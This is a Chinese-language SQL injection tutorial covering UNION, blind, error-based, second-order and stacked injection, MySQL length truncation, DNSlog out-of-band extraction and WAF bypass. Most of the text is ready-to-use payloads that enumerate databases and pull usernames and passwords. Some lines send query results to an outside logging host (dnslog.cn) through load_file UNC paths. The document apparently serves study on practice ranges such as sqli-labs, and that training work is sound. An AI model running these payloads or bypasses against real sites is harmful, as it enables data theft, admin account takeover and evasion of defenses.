所谓GET型注入，顾名思义，即注入点的参数是同通过GET请求发送到后端进行处理的。其又可以分为下面两种情形： 3.2 POST型注入 同理POST是不同于GET的另一种传参方式，大多出现在各种框处，比如登录框，查询框，和各种与数据库有交互的框。post注入和get注入基本没有本质的区别，除了在宽字节注入方面的操作有所区别，基本操作一致。 3.3 url注入 即注入点在url中。举个例子，现在有一个网页，实现了根据学生学号，来查询学生基本信息的功能，学生的id信息是通过GET方法传参发送到后端的，其请求的url如下 http://www.armandhe.com/query.php?id=20140379 后台处理代码如下 $query=\"select name,age,gender from t_students where id={$_GET['id']}\"; 在该例中，我们通过修改url中的id参数的值，来控制前端页面的显示结果。因为没有过滤的原因，我们输入的任何参数值都将被直接拼接到SQL查询语句中，那么我们就可以通过联合查询注入的方式进行注入。 3.4 请求头注入 简单理解就是注入点在请求头中。还是上面的例子，不过url中的参数被后端进行了严格的过滤，不存在任何的注入方法，但后端在进行处理的时候不仅仅是使用了查询语句，还对我们请求头中的user-agent字段在数据库中进行了查询，来防止恶意爬虫，但憨憨程序员却没有对用户的请求头做过滤。于是乎我们可以在请求头中构造恶意代码。同理，不只是user-agent字段，其他字段包括referer等，都可以进行注入，后端处理逻辑如下 $link = @mysqli_connect($host,$username,$password,$dbname,$port); $userAgent=getallheaders()['User-Agent']; $query=\"select * from AgentJudge where userAgent='{$userAgent}'\"; $result=mysqli_query($link,$query); if (mysqli_num_rows($result)!=0){ print('请不要恶意浏览本网页'); } 可以看到后端代码中并没有对user-agent字段做过滤，那么我们就可以直接开始构造注入语句 0x04 按照有无回显分 4.1 注入步骤 判断注入点是否存在 首先我们需要判断注入点是否存在，如果在页面的url中存在某些参数，比如下面这个URL中就存在一个id参数：http://xxxxx.xxx/?id=1 我们就可以尝试改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。 猜测查询的SQL语句大致为： select * from [表名] where id = 1; 常见注入点: 1.GET/POST/PUT/DELETE参数 2.X-Forwarded-For 3.文件名 接下来我们就可以进行测试，看看我们传入的参数是否会被带入数据库查询，测试的方法如下：(这里也称为sql脱库即拿出数据库里面的数据) 添加单引号 添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。 添加逻辑运算 添加[and 1 = 1]和[and 1 = 2] 在添加逻辑运算之前我们需要判断或者猜测注入点的数据类型和闭合方式，并对语句进行相应的引号、括号闭合。 比如字符型我们可以直接添加and 1=1 ，而单验号闭合的字符型我们就需要添加 'and '1'=1 ，或 'and '1'=1' # 使用注释符号将后面的引号直接注释掉。 添加了逻辑运算符之后提交，因为1=1恒为真，而1=2恒为假，所以如果我们的输入带入了数据库，一定会影响到SQL语句的布尔状态，如果两次查询返回的页面不同，说明页面存在布尔状态，此处存在注入漏洞，可以考虑使用布尔盲注进行注入。 添加sleep( )函数 sleep()函数可以让程序在当前位置停留指定的时间，于是我们可以通过观察页面相应的时间来判断我们插入的参数是否会被带入数据库执行。 在参数后添加 and sleep(5) 然后观察页面响应时间是否明显变长，或直接在开发者工具中网络选项卡下观察页面的响应时间。如果页面响应时间确实按照我们的要求增加了5秒，则说明此处存在注入漏洞，我们可以考虑通过延时注入。 在这里我们需要知道，我们构建union select语句时，当前面的查询语句为假，也就是数据不存在时，union select之后查询出的结果就会显示在页面中。这里我们可以通过在前面查询语句中添加 and 1=2 使语句变假，也可以直接将id传入一个负数，来使语句变假。 STEP1：判断闭合符 STEP2：判断列数 联合查询会将两条查询语句的查询结果拼接到一起返回！于是反映出联合查询需遵守的一个规则便是，两条查询语句的查询字段数必须相等，于是乎在利用联合查询进行注入的时候，我们第一步要做的就是判断判断后端代码中的SQL查询语句的字段数。 select id,username,passwd from t_user order by 4; order by +数字 通过页面状态查看有几列然后通过union select 判断回显位（注意判断回显位的时候，前面查询的值要为假，不然回显位会被前面查询的结果所占用，导致看不到回显位） 靶场经验（如果order by被过滤了，可以通过 group by 来判断，或者 union select 1,2,3,4,5,6, 这两的列数查询判断网页状态） STEP 3：查数据库名 注意：（union 和union all 的区别 union all 显示重复的值，而union不显示重复的值，当union select 用不了的时候可以通过union all 来查询） ?id=-1 union select 1,database(),1--+ ​ 注意id=-1,此处id的值必须是一个在数据库中id字段不存在的值，否则联合查询第一条语句的查询结果将占据显示位，我们需要的第二条查询语句的查询结果就不能正常显示到浏览器中。 STEP 4：查表名 ​ 假如上一步查询出来的数据库名为security ?id=-1' union select 1,group_concat(table_name),1 from information_schema.tables where table_schem='security'--+ 注意第二条查询语句我们payload插入位置的字段一定要在前端有回显，否则我们将不能查看到查询结果。 STEP 5：查列名 假如上一步查询出来的表名中有user表 ?id=-1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='user'--+ STEP 6：查数据 假如上一步查询出来的字段有username与password ?id=-1' and select 1,group_concat(concat(0x7e,username,0x7e,passwd,0x7e)),1 from user--+ 4.2 有回显 4.2.1 联合查询注入 information_schema库简介 information_schema库是mySQL自带的一个库，其中包含了当前数据库管理系统的所有信息，但该数据库并不是一个实体的数据库，它不存储任何实际意义上的数据，它只是整个数据库管理系统的一个视图，当某个数据库的某个表发生变化时，information_schema库中相关的数据将同时发生变化。 在注入中，我们关注的是该库中的schemata、tables、columns三个表。他们分别存储了整个数据库管理系统的所有数据库信息，表信息，字段信息。在schemata表中，通过schema_name字段可以获取所有的数据库名；在tables,通过table_name、table_schema字段可以获取所有的表名与其对应的数据库名；在columns表中，通过columns、table_name、table_schema字段可以获取所有的字段名以及其所属表与数据库。 我们的注入思路就是先通过mysql的内建函数database(),获取当前数据库名，再通过tables表获取，所有的表信息，再通过columns表获取上述表所有的字段，最后通过字段查询想要的数据。 当然使用information_schema库查询信息有一个很重要的条件限制，那就是，需要当前连接数据库的用户具有读该数据库的权限， 应用场景 UNION连续的几个查询的字段数一样且列的数据类型转换相同，就可以查询数据； 注入点有回显； 只有最后一个SELECT子句允许有ORDER BY；只有最后一个SELECT子句允许有LIMIT。 UNION注入的流程 graph LR A[order by确定列数] --&gt; B[\"查看返回点,选取可以显示数据的位置\"] B --&gt; C[\"读库、读表、读数据(可执行任意语句)\"] 注意: 为什么 order by 能确定列数？order by 的作用为根据一列或者多列的值，按照升序或者降序排列数据，当超出表的列数时发生报错。 为什么需要确定列数？UNION 内部的 SELECT 语句必须拥有相同的列（可用二分快速查找） 4.2.2 盲注 盲注又分为布尔盲注与时间盲注两种类型 布尔盲注 基本原理是：通过控制通过and连接起来的子句的布尔值，来控制页面的显示结果来判断and后子句的真实性,bool盲注适用于bool判断的结果能够回显在界面内容中的情况，例如界面文本的变化。举个例子 ?id=1' and substring(database(),1,1)='s'--+ 根据and的特性，当and运算符左边的计算结果为真时会继续判断后边的运算结果，如果右边的结果也为真则整个语句为真，当右边的语句为假时，则整个语句为假；当and左边的运算结果为假时，则直接判断整个语句为假，举例如下 1==1 and 1==2 //false 1==1为true,继续判断1==2的结果为false，整体为false 1==1 and 2==2 //true 1==1为true,继续判断2==2的结果为true，整体为true 1==2 and 1==1 //false 1==2为flse,直接判断整体为false，不再对右边的内容进行判断 1==2 and 1==2 //fale 1==2为flse,直接判断整体为false，不再对右边的内容进行判断 ​ 利用and的这个特性，id=1恒为真的时候，and右边substring子句的执行结果将直接影响这个SQL查询语句的结果，即substring子句为真，整个查询语句为真，页面正常回显内容，当substring子句为假的时候，整个查询语句为假，页面不正常回显内容。 ​ 在上面我们构造的查询语句中，对数据库名的第一个字段进行了判断，假如判断正确，那么接着对第二个字符进行判断 ?id=1' and substring(database(),1,2)='se'--+ ​ 直到数据库名的最后一个字符被找出来。可以看到这个过程耗时耗力，我们要对所有可能的大小写字母、数字、特殊字符进行枚举，所以可以考虑透过自动化脚本的方式来进行判断。这里对脚本的编写推荐适用python语言，其request可以很方便的构造请求。 ​ 要获取表名、字段名、数据，只需将上述database()替换为对应payload即可，如要获取表名 1' or length((select database()))=8# //判断数据库名字长度 1' or ascii(substr((select database()),1,1))=115# //判断数据库名 1' or (select count(table_name) from information_schema.tables where table_schema=database())=4# //判断表的个数 1' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117# //判断表的名字 1' or (select count(column_name) from information_schema.columns where table_name='users')=14# //判断列的个数 1' or ascii(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1,1))=117# //判断列的名字 1' or (select count(username) from users)=13# //判断用户名和密码的个数 1' or ascii(substr((select username from users limit 0,1),1,1))=68# //判断用户名和密码 //or当然在不对 1 进行判断的情况下可以换为and 时间盲注 ​ 时间盲注与布尔盲注有异曲同工之妙，只不过判断语句正确与否的标志不再是查询结果有没有被正确得回显，而是网页的响应时间。看下面语句: ?id=1' and if (length(database())&lt;20,sleep(5),1)--+ ​ 上例中，通过length函数获取了当前数据库的长度并与20进行比较，如果数据库名长度小于20，那么则延时5秒向后端脚本程序回显查询结果，如果数据库名不小于20，则直接回显结果。延时5秒的结果表现在客户端就是当前浏览器tab的标题部分会一直转圈圈。然后通过二分法。即将上述语句中的20改为10继续测试，如果不小于10，则在将10修改为15，按照此规律我们逐渐紧逼找到当前数据库名的真正长度。数据库名的长度确认之后，我们就要开始获取数据库名的值了： ?id=1' and if (substring(database(),1,1)='s',sleep(5),1)--+ ​ 通过上述布尔盲注中讲到的方法，最终获取到数据库名。当然上面的语句我们还有其他的变种，如： ?id=1' and if (ascii(substring(database(),1,1))=67,sleep(5),1)--+ //通过ascii码来比较 ?id=1' and if (hex(substring(database(),1,1))=FF,sleep(5),1)--+ //通过十六进制值来比较 ?id=1' and if (mid(database(),1,1)='s',sleep(5),1)--+ //使用mid函数代替substring ?id=1' and if (substr(database(),1,1)='s',sleep(5),1)--+ //和substring是等效的 ?id=1' and if (left(database(),2)='se',sleep(5),1)--+ //截取左边两个个字符 ?id=1' and if (right(database(),2)='ty',sleep(5),1)--+ //截取右边两个字符 ​ 要获取表明、字段名、数据只需将上面payload中的database()替换为联合查询注入中的payload即可，如要获取表名，则构造如下语句： ?id=1'and if(length((select database()))&gt;9,sleep(5),1)--+ //长度 ?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+//名字 ?id=1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1))=5,sleep(5),1)--+//长度 ?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()limit 3,1),1,1))&gt;99,sleep(5),1)--+ //名字 ?id=1' and if((select count(column_name) from information_schema.columns where table_name='users'),sleep(5),1)=14--+ //个数 ?id=1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1))=8,sleep(5),1)--+ //长度 ?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1,1)),sleep(5),1)=117--+ //列名 ?id=1' and if((select count(username) from users)&gt;13,sleep(5),1)--+ //多少个用户名 ?id=1' and if(length(substr((select username from users limit 0,1),1))=4,sleep(5),1)--+ //用户名或者密码的长度 ?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(5),1)--+ //每个用户名和密码的名字 1、mid()函数 此函数为截取字符串一部分。MID(column_name,start[,length]) 2、substr()函数 用法：substr(string string,num start,num length); string为字符串；start为起始位置；length为长度。 注意：mysql中的start是从1开始的。 例：substr(database(),1,1)=‘a’ 通过=右侧字母的改变和表达式的真假判断库名 3、left()函数 此函数用法：left(a,b) 从左侧截取 a 的前 b 位 例：left(database(),1)=‘a’ 通过=右侧字母的改变和表达式的真假判断库名 4.2.3 报错注入 报错注入就是利用数据库的某些正常的机制，人为得制造错误，将查询得结果携带在报错信息中回显到客户端。 什么场景下有用？ 查询不回现内容，但会打印错误信息 Update、Insert等语句，会打印错误信息（前面的union 不适合 update 语句） 这种场景的源码是怎样的? if($row) { echo 'Your Login name:'.roe['username']; } else { print_r(mysql_error()); } 当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容，即可实现SQL注入。 那么实现SQL注入的难点就在于构造语句，制造错误，让错误中包含数据库内容。 这里介绍3个函数引起报错，其他的函数类似。 floor() select count() from information_schema.tables group by concat((select version()),floor(rand(0)2)) 注: group by对rand（）函数操作时产生了错误 extractvalue() extractvalue(1,concat(0x7e，(select user()),0x7e)) 注: xpath语法导致的错误 updatexml() select updatexml(1,concat(0x7e,(select version()),0x7e),1) 注: xpath语法导致的错误 updatexml注入 ​ updatexml函数接受三个参数，第一个参数是一个xml格式的字符串，第二个参数是符合xpath语法规范的字符串，第三个参数是要替换成的字符串。该函数的功能就是从第一个xml字符串中通过xpath语法选择匹配的部分替换成第三个参数的内容。并且当xpath语法出现错误的时候，将会回显数据，于是我们将我们的查询语句放到第二个参数中，作为错误回显的一部分外带到客户端浏览器。比如需要获取库名，则构造如下语句 ?id=1' and updatexml(1,concat(0x7e,database()),1)--+ //and可以被替换为or,如果为or,则还有一处需要修改，请自行思考(我估计是改为-1即可) ​ 注意，concat是必须的，0x7e也是必须的，否则将不会回显错误信息，0x7e可以被别的十六进制数代替，但是有限制的，亲们可以自行尝试。且0x7e位置上的数字转换后必须为字符型，concat只能连接字符串，不能连接数字。获取表名、列名、数据的方法参见前文描述，这里不再赘述。 extractvalue注入 ​ 该函数与updatexml很像，但他只接受两个参数，且其定义与updatexml一样。 ?id=1' and extractvalue(1,concat(0x7e,database()))--+ //and可以被替换为or,如果为or,则还有一处需要修改，请自行思考 主键重复报错 看下面的例子 ?id=1' or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+ group by子句能够根据一个或多个列对结果集进行分组 floor函数的功能为向下取整 rand函数将根据传入的随机数种子生成一个0-1之间的随机数，当传入的种子固定的时候，随机数的规律也就固定下来。 count为聚合函数，配合group by 子句，将对分组字段相同的值进行计数。 分析上面的例子将要达到的查询效果是：从information_schema.tables表中根据拼接字段alias_a对结果集进行计数输出。 ​ 在上例中rand函数生成的随机数乘以2的范围就是0-2，那么再使用floor函数进行向下取整，其值就只能是0或者1。同时因为group by 的特性使得其在进行分组的时候会对后面的字段进行两次运算，group by 在进行分组的时候，会生成一张虚拟表记录数据，那么假设一种情况，当group by进行第一次运算的时候，发现虚拟表中没有相同的数据，准备进行插入操作，但因为rand函数的随机性，导致在第二次运算的时候产生的结果在虚拟表中已经存在，那么在插入该数据的时候就会产生主键冲突，从而产生报错信息，将我们需要的数据通过报错信息外带。 ​ 下例是查询数据库的payload，查询表名的方法如下，其他信息的查询方法请自行思考 ?id=1' or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+ 可以总结出来一个模板 ?id=1' or (select 1 from (select count(*),concat((payload),floor(rand(0)*2)) from information_schema.tables group by alias_a)b)--+ ​ 只需将上面模板中的内容替换成为我们的查询payload即可,alias_a与b均是字段别名 几何函数注入 可以使用的几何函数 geometrycollection:存储任意集合图形的集合 multipoint:存储多个点 polygon:多边形 multipolygon:多个多边形 linstring：线 multilinestring：多条线 point：点 payload: select * from test where id=1 and mutilinestring((select*from(select * from (select user())a)b))) //构造语法都是这样。 GeometryCollection((select * from (select * from(select user())a)b)) polygon((select * from(select * from(select user())a)b)) multipoint((select * from(select * from(select user())a)b)) multilinestring((select * from(select * from(select user())a)b)) LINESTRING((select * from(select * from(select user())a)b)) multipolygon((select * from(select * from(select user())a)b)) 只要上述函数中的参数不是集合形状数据，就会报错。有mysql版本限制。以上列表中基于geometric(集合函数)的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。 基于溢出的注入 ~：按位取反（得到数据的二进制后，按位取反） exp(3)：自然对数的3次方，很容易就溢出了 select * from mysql.user where id=1 and exp(~(select * from (select user())a)); ~后的内容被取反后会得到一个很大的数，再做为自然对数的指数，得到的值一定会溢出，从而报错将查询结果显示出来. 基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。 4.2.4 二次注入(二阶注入) 二阶注入是指已存在的用户输入的数据被存储到数据库中，在用户再次使用该数据的时候导致的注入，这种注入类型是很难通过工具扫描或者黑盒测试发现的，往往需要通过白盒测试才能发现。比如现在有一个网站提供了用户注册与修改密码的功能。在用户登录的时候，通过函数对用户的输入进行了转义，如 专有名词： 白盒测试也称为结构测试，主要用于检测软件编码过程中的错误。程序员的编程经验、对编程软件的掌握程度、工作状态等因素都会影响到编程质量，导致代码错误。 黑盒测试又称为功能测试，主要检测软件的每一个功能是否能够正常使用。在测试过程中，将程序看成不能打开的黑盒子，不考虑程序内部结构和特性的基础上通过程序接口进行测试，检查程序功能是否按照设计需求以及说明书的规定能够正常打开使用。 $link = @mysqli_connect($host,$username,$password,$dbname,$port); $username=mysql_real_escape_string($_POST['username']); $passwd=mysql_real_escape_string($_POST['passwd']); $repasswd=mysql_real_escape_string($_POST['repasswd']); if ($passwd==$repasswd){ $query=\"select * from t_user where username='{$username}' and passwd=='{$passwd}'\"; $res=@mysqli_query($link,$query); if (mysqli_num_rows($res)==1){ //登录成功 }else{ die('用户名或密码错误') } }else{ die(\"两次输入密码不一致\") } 可以看到在登录界面，用户名与密码被mysql_real_escape_string函数做了转义，那么我们输入的单引号或者双引号就失去了作用，于是我们不能通过简单一次注入获取数据。再看用户注册界面的代码 $link = @mysqli_connect($host,$username,$password,$dbname,$port); $username=mysql_escape_string($_POST['username']); $passwd=mysql_escape_string($_POST['passwd']); $repasswd=mysql_escape_string($_POST['repasswd']); if ($passwd==$repasswd){ $query=\"select * from t_user where username='{$username}'\"; $res=@mysqli_query($link,$query); if (mysqli_num_rows($res)!=0){ //当前用户已存在 }else{ $query=\"insert into user values ('{$username}','{$passwd}')\"; $res=@mysqli_query($link,$query); if (mysqli_affected_rows=1){ //新增用户成功 }else{ //未知错误，请检查后再输入 } } }else{ die(\"两次输入密码不一致\"); } 可以看到注册界面的输入也被转义了，但是有一点，需要明确的是，经过msql_real_escape_string和addsashes转义的字符在插入到数据库中之后，会被解转义，不然我们注册的用户名就变了。利用这个特性我们就可以搞事情了。在用户修改密码时由这样的语句 $link = @mysqli_connect($host,$username,$password,$dbname,$port); $username=mysql_escape_string($_POST['username']); $oldpasswd=mysql_escape_string($_POST['oldpasswd']); $newpasswd=mysql_escape_string($_POST['newpasswd']); $repasswd=mysql_escape_string($_POST['repasswd']); //首先判断用户名密码是否正确 $query=\"select * from t_user where username='{$username}' and passwd='{$oldpasswd}'\"; $res=@mysqli_query($link,$query); if ($newpasswd==$repasswd &amp;&amp; mysqli_num_rows($res)!=0){ $query=\"update t_user set passwd='{$newpasswd}' where username='{$username}'\"; $res=@mysqli_query($link,$query); if (mysqli_affected_rows=1){ //密码修改成功 }else{ //未知错误，请检查后再输入 } }else{ die(\"两次输入密码不一致或者用户名或者老密码输入错误\"); } 假如我们知道有一个用户名为admin的管理员账户，那么我们首先可以注册一个admin’#的账号，’#根据实际情况确定，密码为123456，然后我们正常登录到我们新注册的账号，跳转到修改密码的界面，然后输入用户名与密码之后点击确认，这时候后台的update语句变成了 $query=\"update t_user set passwd=654321 where username='admin'#'\"; 所以这时候就修改了账户名为admin的密码，这时候我们就可以用我们的新密码直接登录管理员账户admin了。大家可以到sqli_labs靶场第24关进行试验。 4.2.5 堆叠注入 mysqli_multi_query()函数： Stackedinjections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做堆叠注入 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 使用条件 mysqli_multi_query（）执行多条查询的函数——防止注入改成mysqli_query()函数 堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用**mysqli_multi_query()**函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。 我们就可以在普通注入的后面，写上一条任意的SQL语句，例如插入数据，或者删库。 ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+ //执行完上述语句，我们得知了列名，此时我们根据具体列名，进行sql查询，删除等语句的执行 ?id=-1' ;insert into users(id,username,password)values(115,'1234','4567'); ?id=-1' ;insert into users(id,username,password)values(100,'772211','112277'); 随后执行?id=56，可以看到自己成功插入了密码用户名 4.2.6 小tip: mysql长字符截断 mysql中有一个环境变量配置sql_mode,定义了mysql应该支持的sql语法，数据校验等,可以通过以下方式查看当前数据库使用的sql_mode： select @@sql_mode 具体的参数解释见参考资料5：MySQL的sql_mode模式，mysql5.0版本以上支持了三种sql_mode模式，如下： 默认情况下，mysql选择使用的是严格模式，此时如果插入的数据超过限制长度，则会报错error(如果超出的长度是由空格引起的，可能只会警告warning，实际操作证明，三种模式下，如果插入的超出长度是由空格引起的，并不会报错，仅仅会警告，本节最后给出结果): describe users; insert into users values (1,'admin','123');#正常插入 insert into users values (2,'admin ','123'); #username限制7个字符，这里插入8个字符（后3个为空格，插入成功，出现警告），出现截断情况 insert into users values (3,'admin x','1234');#报错，提醒超长字符 对于id=2的插入，可以查看其usernsme的长度,发现其长度为7: select length(username) from users where id = 2; 下面重点讨论当sql_mode模式为ANSI时引起的长字符截断问题： 首先将sql_mode设置为ANSI模式： SET @@sql_mode=ANSI; 接下来依次创建table,插入数据，这里发现username='admin x’也插入成功了： create table users( -&gt; id int(11) NOT NULL, -&gt; username varchar(7) NOT NULL, -&gt; password varchar(12) NOT NULL);#创建users表格 insert into users values (1,'admin',123);#正常插入 insert into users values (2,'admin ',1234);#警告，插入成功 insert into users values (3,'admin x',12345);#警告，插入成功 观察一下各个用户的长度，可以发现id=2,id=3的username均被截断，长度都变成了7： select *from users; select length(username) from users where id =1; select length(username) from users where id =2; select length(username) from users where id =3; 如果此时选择username= 'admin’会出现下面情况： select username from users where username = 'admin'; 此时，我们只查询了用户名为admin的用户，但另外两个长度不一致的用户却出现，这会造成安全问题。假如，某个管理员的用户名就是admin,他采用下面的语句登录： $sql = \"select count ( * ) from users where username = ‘admin’ and password = ‘*****’ \"; 此时，我们只要伪造用户’admin x’便可以获得管理员的信息，从而进入后台。 补充： 对于三种模式下的空格插入溢出，并不会报错，结果如下： SET @@sql_mode=STRICT_TRANS_TABLES; insert into users values (4,'admin ',12345); insert into users values (5,'admin x',12345); SET @@sql_mode=TRADITIONAL; insert into users values (6,'admin ',123456); insert into users values (7,'admin x',123456); 由此可见，预防长字符截断问题可能需要从其他地方入手，如账号由管理员分配并限制更改；对数据库内容加密，即使获取到相关信息也无法破解。 假设管理员的账号就是admin，那么我们就去注册一个admin 的用户.(PS:后面有哦很多空格，等待被截取掉就直接替换掉admin这个账号了)，也就是我们可以登录账户名为admin的账号了。 4.3无回显 4.3.1 DNS Log 我们在发起网络请求的时候，第一步就是解析域名，当域名被成功解析的时候，该域名解析结果将被域名服务器记录下来，我们利用的正是这一点，将我们想要的数据放在域名的下一级域中外带到域名服务器，通过查询域名服务器的日志，从而获得我们想要的数据，如我们使用www.dnslog.cn 这个网站来测试 ping命令测试： 点击获取子域名获取一个包含三级域名的域名给我们，这里我们使用ping命令做测试 ping %USERNAME%.4ap7wz.dnslog.cn 当ping通的时候，我们点击该网站的刷新记录就可以看到我测试主机的用户名ChinaArmand了。该注入方法适用于需要时间盲注、没有回显的注入场景。构造mysql语句如下 ?id=1' and (select load_file(concat('\\\\\\\\',(select database()),'.4ap7wz.dnslog.cn\\\\abc'))) 在到www.dnslog.cn看看是不是获取到了我们的数据库名,我们可以看到上面的语句使用了\\，这是windowsUNC路径的表示方法，所以在SQLI中DNSLog只适用于windows平台的服务器 。 unc路径，是在windows平台上访问局域网网络资源的一种路径表示方法，我们在window上使用的文件共享服务路径就是通过这种方式，\\172.16.11.24 这也就解释了为什么只能在window平台的服务器上有效，另外多出来的两个\\表示转义。 load_file 受mysql配置文件中secure_file_priv选项的限制， secure_file_priv= //允许所有 secure_file_priv=\"G:\\\" //允许加载G盘 secure_file_priv=null //拒绝 DNSlog 介绍 首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件， DNSlog回显原理 首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域名，三级域名,例如 gaobai.kxsy.com, 通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来就是DNSlog, DNSlog 应用 1.sql布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显可利用NDSlog 2.无回显的命令执行 推荐三个大众化的免费dns解析记录网站 http://www.dnslog.cn http://admin.dnslog.link http://ceye.io DNSlog回显注入条件 1.数据库root权限， 2.数据库可读写权限，secure_file_priv值为空，上期笔记有说明， 3.windows系统， DNSlog-sql注入 1.注册一个dns解析服务，利用唯一标识符，以无回显sql注入为例 2.注入测试 需要闭合语句 替换标识符 利用盲注回显 ?id=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.tlyypi.dnslog.cn\\\\abc'))),1,0)--+ 在回显数据时，域名能够接受的字符是有条件限制的，某些不适合作为域名的特殊字符可能会被屏蔽掉，针对这种情况我们也可以base64编码后再进行请求。 0x05 SQLI防御及绕过 WAF产生的背景： 传统防火墙 （ firewall ） 阻断数据包工作网络层Web服务器功能丰富成为攻击目标 （应用层）waf由此而生WAF（web application rewall）称为web应用防火墙，他是通过执行一系列针对HTTP，HTTPS的安全策略，来专门对web应用提供保护的一款产品。WAF是基于规则的防护，可以提供各种web应用的安全规则，waf生产商去维护这个规则库，并实时为其更新，用户按照这些规则，可以对应用进行全方面的保护 架构层绕过waf 用户本身是进入waf后访问web页面的，只要我们找到web的真实IP，绕过waf就不在话下了在同网段内，页面与页面之间，服务器与服务器之间，通过waf的保护，然后展示给我们，只要我们在内部服务之间进行访问，即可绕过waf边界漏洞，同样类似于同网段数据，我们可以利用已知服务器存在的ssrf漏洞，将数据直接发送给同网段的web2进行SQL注入 资源限制角度绕waf 由于数据太大，会导致waf无法将所有的数据都检测完，这个时候会忽略掉我们代入的sql注入语句，从而绕过waf，即：使用POST请求，对服务器请求很大资源数据,逃逸sql注入语句。 协议层面绕过 基于协议层，有的waf只过滤GET请求，而对POST请求没做别的限制，因此，可以将GET型换为POST型文件格式，页面仅对Content-Type为application/x-www-form-urlencoded数据格式进行过滤，因此我们只要将Content-Type格式修改为multipart/form-data，即可绕过waf参数污染：有的waf仅对部分内容进行过滤，例如：index.php？id=1&amp;id=2&amp;id=3这样的参数id=1，waf也仅对前部分的id=1进行检测，而后面的参数并不做处理。这样我们就可以在id=2的后面写入sql注入语句进行sql注入 规则层面绕waf 等价函数 : hex()、bin() ==&gt; ascii() sleep() &gt;benchmark() concat_ws()&gt;group_concat() mid()、substr() ==&gt; substring() @@version ==&gt; version() 等价符号 : and和or不能使用可以尝试下&amp;&amp;和||，还有=不能使用的情况可以考虑尝试&lt;、&gt;因为如果不小于又不大于那便是等于。逻辑异或xor,like(可以)特殊符号:使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用, group by 9(可以) 缓冲区溢出： and(select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version()　--+ asp允许每个字符前面添加一个%号SELECT FIELD FROM TABLE ààà %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 5.1 嵌套及大小写混淆绕过 如果后台存在这样的语句 $arg=str_replace('union','',$_GET['id']) //将union替换为空 或者 $arg=preg_replace('/union/i','',$_GET['id']) //将union替换为空，且不区分大小写 我们可以这样构造payload ?id=1' ununionion select 1,2,3%23 //上面两种用法均可这样绕过 str_replace函数时不区分大小写的我们还可以通过UNion来绕过 ?id=1' UNion select 1,2,3 --+ 5.2 空格被过滤的绕过 通过内内联注释 部分程序过滤了空格，将输入限制为单个，则可以通过内联注释绕过 还可通过%a0 ,%09,%0a,%0b,%0c,%0d绕过 ?id=1' /**/union/**/order/**/by/**/2 %23 //这里/* */中间部分的符号因题而异，可能会有字符的过滤，需要一个一个尝试，或者bp爆破 通过括号–emmmmm基本没啥用，就当作SQL语句的拓展吧（倒是可以跟报错注入利用，毕竟报错注入需要的空格少） 通过括号代替空格有点鸡肋，关键字是不能被括起来的，否则会报错，比如order by 3不能写作`(order)(by)(3)基本没啥用。 5.3 逗号被过滤的绕过 select substr(database() from 1 to 1); select mid(database() from 1 to 1); 作用也不大，用到逗号的地方很多，如要查两个字段union select username,passwd这里的逗号就不能这样写，当然我们可以每次只查一个字段。 5.4 空字节绕过（也就是%00截断） 用于绕过一些入侵检测系统，如ids 